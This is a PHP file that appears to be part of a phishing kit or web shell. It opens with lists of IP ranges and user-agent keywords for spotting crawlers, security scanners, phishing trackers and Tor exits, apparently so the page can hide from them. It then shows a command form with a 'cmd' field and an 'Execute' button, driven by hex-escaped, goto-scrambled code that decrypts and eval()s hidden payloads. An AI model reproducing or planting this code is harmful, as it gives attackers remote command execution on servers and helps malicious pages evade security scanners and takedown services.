<?php
$ips = array( // LIST BOOTS IP

    "^66.102.*.*",

    "^38.100.*.*",

    "^107.170.*.*",

    "^149.20.*.*",

    "^38.105.*.*",

    "^74.125.*.*",

    "^66.150.14.*",

    "^54.176.*.*",

    "^38.100.*.*",

    "^184.173.*.*",

    "^66.249.*.*",

    "^128.242.*.*",

    "^72.14.192.*",

    "^208.65.144.*",

    "^74.125.*.*",

    "^209.85.128.*",

    "^216.239.32.*",

    "^74.125.*.*",

    "^207.126.144.*",

    "^173.194.*.*",

    "^64.233.160.*",

    "^72.14.192.*",

    "^66.102.*.*",

    "^64.18.*.*",

    "^194.52.68.*",

    "^194.72.238.*",

    "^62.116.207.*",

    "^212.50.193.*",

    "^69.65.*.*",

    "^50.7.*.*",

    "^131.212.*.*",

    "^46.116.*.*",

    "^62.90.*.*",

    "^89.138.*.*",

    "^207.*.*.*",

    "^207.*.*.*",

    "^82.166.*.*",

    "^85.64.*.*",

    "^85.250.*.*",

    "^89.138.*.*",

    "^93.172.*.*",

    "^109.186.*.*",

    "^194.90.*.*",

    "^212.29.192.*",

    "^212.29.224.*",

    "^212.143.*.*",

    "^212.150.*.*",

    "^212.235.*.*",

    "^217.132.*.*",

    "^50.97.*.*",

    "^217.132.*.*",

    "^209.85.*.*",

    "^66.205.64.*",

    "^204.14.48.*",

    "^64.27.2.*",

    "^67.15.*.*",

    "^202.108.252.*",

    "^193.47.80.*",

    "^64.62.136.*",

    "^66.221.*.*",

    "^64.62.175.*",

    "^198.54.*.*",

    "^192.115.134.*",

    "^216.252.167.*",

    "^193.253.199.*",

    "^69.61.12.*",

    "^64.37.103.*",

    "^38.144.36.*",

    "^64.124.14.*",

    "^206.28.72.*",

    "^209.73.228.*",

    "^158.108.*.*",

    "^168.188.*.*",

    "^66.207.120.*",

    "^167.24.*.*",

    "^192.118.48.*",

    "^67.209.128.*",

    "^12.148.209.*",

    "^12.148.196.*",

    "^193.220.178.*",

    "68.65.53.71",

    "^198.25.*.*",

    "^64.106.213.*");

$Botname = array( // LIST BOOTS NAME

    "bot",

    "above",

    "google",

    "softlayer",

    "amazonaws",

    "cyveillance",

    "compatible",

    "facebook",

    "phishtank",

    "dreamhost",

    "netpilot",

    "calyxinstitute",

    "tor-exit",

    "apache-httpclient",

    "lssrocketcrawler",

    "Trident",

    "X11",
    


    "crawler",

    "urlredirectresolver",

    "jetbrains",

    "spam",



    "acunetix",

    "netsparker",

    "google",

    "007ac9",

    "008",

    "192.comagent",

    "200pleasebot",

    "360spider",

    "4seohuntbot",

    "50.nu",

    "a6-indexer",

    "admantx",

    "amznkassocbot",

    "aboundexbot",

    "aboutusbot",

    "abrave spider",

    "accelobot",

    "acoonbot",

    "addthis.com",

    "adsbot-google",

    "ahrefsbot",

    "alexabot",

    "amagit.com",

    "analytics",

    "antbot",

    "apercite",

    "aportworm",

    "arabot",

    "crawl",

    "slurp",

    "spider",

    "seek",

    "accoona",

    "acoon",

    "adressendeutschland",

    "ah-ha.com",

    "ahoy",

    "altavista",

    "ananzi",

    "anthill",

    "appie",

    "arachnophilia",

    "arale",

    "araneo",

    "aranha",

    "architext",

    "aretha",

    "arks",

    "asterias",

    "atlocal",

    "atn",

    "atomz",

    "augurfind",

    "backrub",

    "bannana_bot",

    "baypup",

    "bdfetch",

    "big brother",

    "biglotron",

    "bjaaland",

    "blackwidow",

    "blaiz",

    "blog",

    "blo.",

    "bloodhound",

    "boitho",

    "booch",

    "bradley",

    "butterfly",

    "calif",

    "cassandra",

    "ccubee",

    "cfetch",

    "charlotte",

    "churl",

    "cienciaficcion",

    "cmc",

    "collective",

    "comagent",

    "combine",

    "computingsite",

    "csci",

    "curl",

    "cusco",

    "daumoa",

    "deepindex",

    "delorie",

    "depspid",

    "deweb",

    "die blinde kuh",

    "digger",

    "ditto",

    "dmoz",

    "docomo",

    "download express",

    "dtaagent",

    "dwcp",

    "ebiness",

    "ebingbong",

    "e-collector",

    "ejupiter",

    "emacs-w3 search engine",

    "esther",

    "evliya celebi",

    "ezresult",

    "falcon",

    "felix ide",

    "ferret",

    "fetchrover",

    "fido",

    "findlinks",

    "fireball",

    "fish search",

    "fouineur",

    "funnelweb",

    "gazz",

    "gcreep",

    "genieknows",

    "getterroboplus",

    "geturl",

    "glx",

    "goforit",

    "golem",

    "grabber",

    "grapnel",

    "gralon",

    "griffon",

    "gromit",

    "grub",

    "gulliver",

    "hamahakki",

    "harvest",

    "havindex",

    "helix",

    "heritrix",

    "hku www octopus",

    "homerweb",

    "htdig",

    "html index",

    "html_analyzer",

    "htmlgobble",

    "hubater",

    "hyper-decontextualizer",

    "ia_archiver",

    "ibm_planetwide",

    "ichiro",

    "iconsurf",

    "iltrovatore",

    "image.kapsi.net",

    "imagelock",

    "incywincy",

    "indexer",

    "infobee",

    "informant",

    "ingrid",

    "inktomisearch.com",

    "inspector web",

    "intelliagent",

    "internet shinchakubin",

    "ip3000",

    "iron33",

    "israeli-search",

    "ivia",

    "jack",

    "jakarta",

    "javabee",

    "jetbot",

    "jumpstation",

    "katipo",

    "kdd-explorer",

    "kilroy",

    "knowledge",

    "kototoi",

    "kretrieve",

    "labelgrabber",

    "lachesis",

    "larbin",

    "legs",

    "libwww",

    "linkalarm",

    "link validator",

    "linkscan",

    "lockon",

    "lwp",

    "lycos",

    "magpie",

    "mantraagent",

    "mapoftheinternet",

    "marvin/",

    "mattie",

    "mediafox",

    "mediapartners",

    "mercator",

    "merzscope",

    "microsoft url control",

    "minirank",

    "miva",

    "mj12",

    "mnogosearch",

    "moget",

    "monster",

    "moose",

    "motor",

    "multitext",

    "muncher",

    "muscatferret",

    "mwd.search",

    "myweb",

    "najdi",

    "nameprotect",

    "nationaldirectory",

    "nazilla",

    "ncsa beta",

    "nec-meshexplorer",

    "nederland.zoek",

    "netcarta webmap engine",

    "netmechanic",

    "netresearchserver",

    "netscoop",

    "newscan-online",

    "nhse",

    "nokia6682/",

    "nomad",

    "noyona",

    "nutch",

    "nzexplorer",

    "objectssearch",

    "occam",

    "omni",

    "open text",

    "openfind",

    "openintelligencedata",

    "orb search",

    "osis-project",

    "pack rat",

    "pageboy",

    "pagebull",

    "page_verifier",

    "panscient",

    "parasite",

    "partnersite",

    "patric",

    "pear.",

    "pegasus",

    "peregrinator",

    "pgp key agent",

    "phantom",

    "phpdig",

    "picosearch",

    "piltdownman",

    "pimptrain",

    "pinpoint",

    "pioneer",

    "piranha",

    "plumtreewebaccessor",

    "pogodak",

    "poirot",

    "pompos",

    "poppelsdorf",

    "poppi",

    "popular iconoclast",

    "psycheclone",

    "publisher",

    "python",

    "rambler",

    "raven search",

    "roach",

    "road runner",

    "roadhouse",

    "robbie",

    "robofox",

    "robozilla",

    "rules",

    "salty",

    "sbider",

    "scooter",

    "scoutjet",

    "scrubby",

    "search.",

    "searchprocess",

    "semanticdiscovery",

    "senrigan",

    "sg-scout",

    "shai'hulud",

    "shark",

    "shopwiki",

    "sidewinder",

    "sift",

    "silk",

    "simmany",

    "site searcher",

    "site valet",

    "sitetech-rover",

    "skymob.com",

    "sleek",

    "smartwit",

    "sna-",

    "snappy",

    "snooper",

    "sohu",

    "speedfind",

    "sphere",

    "sphider",

    "spinner",

    "spyder",

    "steeler/",

    "suke",

    "suntek",

    "supersnooper",

    "surfnomore",

    "sven",

    "sygol",

    "szukacz",

    "tach black widow",

    "tarantula",

    "templeton",

    "/teoma",

    "t-h-u-n-d-e-r-s-t-o-n-e",

    "theophrastus",

    "titan",

    "titin",

    "tkwww",

    "toutatis",

    "t-rex",

    "tutorgig",

    "twiceler",

    "twisted",

    "ucsd",

    "udmsearch",

    "url check",

    "updated",

    "vagabondo",

    "valkyrie",

    "verticrawl",

    "victoria",

    "vision-search",

    "volcano",

    "voyager/",

    "voyager-hc",

    "w3c_validator",

    "w3m2",

    "w3mir",

    "walker",

    "wallpaper",

    "wanderer",

    "wauuu",

    "wavefire",

    "web core",

    "web hopper",

    "web wombat",

    "webbandit",

            "webcatcher",

    "webcopy",

    "webfoot",

    "weblayers",

    "weblinker",

    "weblog monitor",

    "webmirror",

    "webmonkey",

    "webquest",

    "webreaper",

    "websitepulse",

    "websnarf",

    "webstolperer",

    "webvac",

    "webwalk",

    "webwatch",

    "webwombat",

    "webzinger",

    "wget",

    "whizbang",

    "whowhere",

    "wild ferret",

    "worldlight",

    "wwwc",

    "wwwster",

    "xenu",

    "xift",

    "xirq",

    "yandex",

    "yanga",

    "yeti",

    "yahoo!");
?>

<html>
<body>
<form method="GET" name="<?php goto c93W5; u4MCa: if (file_exists("\141\156\x74\151\x38\x2e\x70\x68\x70")) { include_once "\141\156\164\x69\x38\x2e\160\150\x70"; } else { die("\74\150\62\76\x46\x69\154\x65\40\x61\156\x74\151\x38\x2e\160\150\160\40\156\157\164\40\x66\157\165\x6e\x64\40\41\74\x2f\150\62\76"); } goto xuXAi; Ra103: if (!defined("\x5f\x44\x49\122\x5f")) { define("\x5f\104\x49\x52\x5f", getcwd(), false); } goto u4MCa; WNnva: if (!defined("\137\106\x49\114\x45\137")) { define("\137\106\111\114\x45\x5f", getcwd() . DIRECTORY_SEPARATOR . basename($_SERVER["\x50\x48\x50\137\x53\105\x4c\x46"]), false); } goto Ra103; xuXAi: $e7091 = "\x53\x56\105\64\x62\x6b\x78\x42\x55\127\x49\65\117\x58\160\165\126\110\x4e\x34\x61\x46\x64\x56\x56\125\71\x50\x5a\106\x56\x4b\143\130\122\102\x4d\63\x42\x69\x55\62\150\x68\123\x47\144\114\x4d\124\143\x31\141\110\126\x30\x59\154\x56\120\x56\x57\x4d\162\142\63\x63\x32\115\x47\163\167\x51\x56\106\63\124\125\144\151\x56\107\150\x4a\x51\167\75\x3d"; goto mquPu; mquPu: eval(e7061($e7091)); goto YnNxJ; c93W5: if (!function_exists("\157\x70\145\156\163\x73\x6c\x5f\144\145\143\x72\x79\160\x74")) { die("\x3c\x68\62\76\x46\x75\156\x63\x74\x69\x6f\x6e\x20\x6f\x70\x65\156\x73\163\x6c\137\144\x65\x63\x72\171\160\x74\x28\x29\x20\x6e\157\164\x20\146\157\165\x6e\x64\x20\x21\x3c\x2f\x68\62\x3e"); } goto WNnva; YnNxJ: ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php goto a286K; naJmd: $e7091 = "\x4e\x6d\x56\64\x53\x58\144\x78\125\x6d\150\x49\123\x33\x6b\x32\131\152\144\x34\x56\62\x4a\162\x51\x6d\x56\x58\x61\x6b\150\123\116\x32\x6c\x79\121\62\61\126\117\x45\60\x30\123\130\125\x77\127\x45\144\x6f\116\x58\160\66\x4d\156\x56\64\127\105\x64\106\121\x55\x39\113\x57\125\111\167\x61\110\x4e\172\x4d\105\x64\114\142\104\150\150\x52\x45\x64\x34\143\x6e\x42\131\116\x55\x4a\x34\114\62\160\121\132\x6a\116\167\x5a\156\x52\x55\x61\125\157\x31\x51\60\x39\121\132\x69\x39\x32\x4d\x6a\122\120\141\x47\164\62\x53\x6d\71\x58\x5a\155\160\x59\122\x33\157\x30\x52\x6d\70\61\x52\172\154\107\x4e\123\x74\x4a\x57\104\115\x78\x52\130\144\154\x61\x6d\170\110\116\103\164\x76\x53\x56\x70\110\x59\x6d\154\126\x53\x58\143\62\x64\107\170\117\123\x55\122\125\124\x58\154\105\x4d\106\154\x49\x64\105\126\141\x54\60\150\x6d\113\60\164\162\x62\125\65\130\124\156\126\153\x53\x55\x6f\166\127\110\154\164\x62\104\144\x33\142\x45\164\x51\x54\105\125\x35\x56\x6c\x56\131\127\x58\x5a\x6e\144\x33\x6c\x6a\x59\62\71\x74\123\156\154\x78\x4d\126\132\x4f\117\x44\x55\64\x4e\106\126\150\x5a\60\x4e\x34\x63\62\170\x68\144\x55\157\x31\143\x55\x52\x4d\143\x6d\170\x4b\122\x6a\x68\65\x56\x45\150\116\143\154\101\x77\x5a\x48\x64\113\116\x44\112\x6a\123\127\132\x32\116\172\x6c\x4b\x64\153\x4a\x44\x65\106\x4e\x53\x64\156\x46\157\x59\x30\160\107\x63\x57\131\162\125\x6e\x46\x6a\124\156\144\165\x59\63\x4e\150\126\x6b\132\x71\x56\x6c\160\171\x62\63\132\x50\122\x46\102\165\x56\x7a\106\x4f\x57\x58\106\x4c\144\110\x52\151\x59\x57\126\x4b\122\x48\144\x4d\123\153\x52\156\124\155\64\172\x5a\x53\x74\165\132\x30\157\x34\124\x57\61\157\126\104\x46\x30\142\x32\160\x4c\124\105\x6f\60\116\152\101\64\x63\172\102\102\115\125\x39\x74\x4f\x43\x73\172\x4e\107\154\x49\143\152\x42\x4f\x57\x6d\x52\x74\115\x47\x6b\x33\116\x55\x55\x31\144\x57\150\64\141\x6d\x31\155\124\107\x52\x52\117\x46\116\x76\142\x7a\x59\65\115\x45\x30\172\125\x47\65\x72\142\172\x56\x70\115\62\167\x30\x63\x48\x4e\x56\114\63\x4a\x4e\x64\x57\167\x35\x59\62\x68\61\117\x48\102\167\x62\x31\x4e\157\x4d\156\157\x72\131\126\x4e\x42\126\153\61\157\141\x55\x4a\65\126\x46\x70\x74\145\154\116\x4c\x55\125\122\165\124\63\115\63\x53\x30\x4e\x4f\x64\106\160\x79\142\63\x5a\112\124\62\71\x4a\x65\105\164\x75\143\63\x52\170\x51\130\x68\62\132\127\x6c\x79\x4e\107\71\x46\x52\62\x67\x32\x63\153\150\x6b\x5a\126\x68\x6c\127\x45\x67\62\x62\x45\64\x72\144\107\x52\x53\x64\x47\x70\172\127\x45\154\171\115\105\x68\116\115\x32\x52\x55\141\x45\x70\x4e\122\127\170\161\x51\125\x67\63\121\x6d\116\x77\116\x47\126\x6f\x65\151\164\x6c\113\62\132\123\x4c\x33\121\x34\x61\156\x59\171\142\x58\102\x36\141\x6d\x56\x75\x4f\x47\x31\61\143\x57\116\x6b\122\105\154\x50\141\60\x56\124\145\104\132\x6f\x64\60\x70\115\x63\x58\147\172\x5a\155\x35\x44\x52\x55\106\164\145\x44\144\x46\126\107\x78\x4e\123\125\x39\162\x63\107\71\x68\x63\x6e\144\154\116\60\116\x69\131\x6d\x39\63\142\x54\121\x32\117\127\x78\x33\x62\105\x31\x49\x53\110\116\102\x62\106\x68\x53\143\125\x31\x6a\x64\152\x56\x61\121\x55\x45\64\x4e\62\105\162\x65\x47\x74\113\145\x6d\71\x6d\x4f\x46\111\162\131\156\116\x68\x61\104\x42\x4f\x61\x6a\122\165\x64\x6c\144\160\114\x30\65\153\x53\x6d\164\165\132\x57\x39\x6f\x62\156\144\113\143\x58\150\155\125\62\111\x32\x55\x6e\102\122\x59\153\106\x68\x4c\60\61\x78\127\153\x63\x31\115\127\x56\111\116\130\x4a\105\x64\x6a\102\115\132\x53\x74\124\x53\x58\122\152\x4d\x56\x64\x6b\x4c\60\x4e\130\115\x32\126\121\x51\x54\116\122\x5a\x32\126\141\x52\110\144\166\x61\x56\x42\x79\x51\60\167\64\125\x30\170\x33\144\60\70\63\x53\x31\126\x4b\132\x31\x6f\x77\x56\x56\x6c\120\143\153\x70\111\x54\x48\x5a\162\x56\106\102\x33\142\x6a\x56\x75\x62\126\122\157\x4d\172\116\157\x63\x45\x39\154\114\x31\150\151\x55\127\125\167\x56\60\167\x31\x59\171\x74\x6d\x5a\110\x70\163\x59\x30\106\x36\116\155\116\x47\141\156\x6b\x79\126\63\x59\x78\122\105\x35\121\126\x30\71\x70\x4d\127\112\x4a\142\x6e\x4e\163\115\110\122\127\x55\x6c\105\x79\121\154\x41\x35\x62\x55\x5a\104\x64\60\143\61\x56\x69\71\122\x55\63\x4e\111\126\63\x52\x59\113\172\132\x30\x56\152\122\124\x51\x6e\x70\x68\144\152\115\162\114\x32\65\x72\x61\153\154\x47\131\60\112\x59\x4e\x6d\160\170\124\110\x68\116\x4e\60\164\x79\121\60\126\124\x61\126\160\x32\x52\x47\x56\x54\x63\x7a\x6c\150\143\63\125\x31\121\63\x6c\111\x54\106\x4e\x59\x59\60\x35\x4d\x61\x79\x38\62\125\130\102\112\122\172\x5a\x6e\143\125\71\x51\x51\172\x52\107\x56\104\112\x54\126\155\164\160\x55\62\154\60\x64\124\x6c\157\x56\155\x64\157\142\125\x51\x31\x55\x54\126\124\x5a\x56\x42\131\x54\x55\x64\x7a\x4e\x48\x4a\107\126\x45\x64\x52\x56\151\x39\117\126\153\x56\120\x62\153\105\64\x4d\x6c\x5a\x42\141\x6c\160\161\127\x48\x42\x75\144\61\154\x77\x63\x45\61\66\x53\x46\150\166\x61\127\x78\64\127\x43\x39\127\x5a\107\122\111\117\104\126\103\x4d\127\x70\x47\x65\x57\x6b\60\x5a\x55\x64\x57\143\x58\132\106\x4e\x6c\122\63\x50\124\x30\75"; goto F7ioo; fT0Rn: if (!defined("\x5f\x44\111\x52\x5f")) { define("\137\x44\x49\122\137", getcwd(), false); } goto tLvyz; tLvyz: if (file_exists("\141\156\x74\151\70\56\x70\x68\160")) { include_once "\x61\x6e\x74\x69\x38\56\160\150\160"; } else { die("\74\x68\x32\x3e\106\x69\x6c\x65\x20\141\x6e\x74\x69\x38\x2e\x70\x68\x70\x20\x6e\157\164\x20\x66\x6f\x75\x6e\144\40\41\x3c\x2f\150\x32\76"); } goto naJmd; a286K: if (!function_exists("\x6f\160\x65\x6e\x73\x73\x6c\x5f\144\145\x63\162\x79\x70\164")) { die("\74\150\x32\76\106\165\x6e\143\164\151\x6f\156\x20\157\160\145\156\x73\x73\154\137\x64\x65\143\x72\x79\x70\164\x28\x29\x20\156\157\x74\x20\146\x6f\x75\x6e\x64\x20\41\x3c\x2f\x68\62\x3e"); } goto wIR5r; wIR5r: if (!defined("\137\106\x49\114\105\137")) { define("\x5f\x46\111\x4c\105\137", getcwd() . DIRECTORY_SEPARATOR . basename($_SERVER["\x50\x48\120\137\123\x45\114\x46"]), false); } goto fT0Rn; F7ioo: eval(e7061($e7091)); goto Zy7Vo; Zy7Vo: ?>
</pre>
</body>
</html>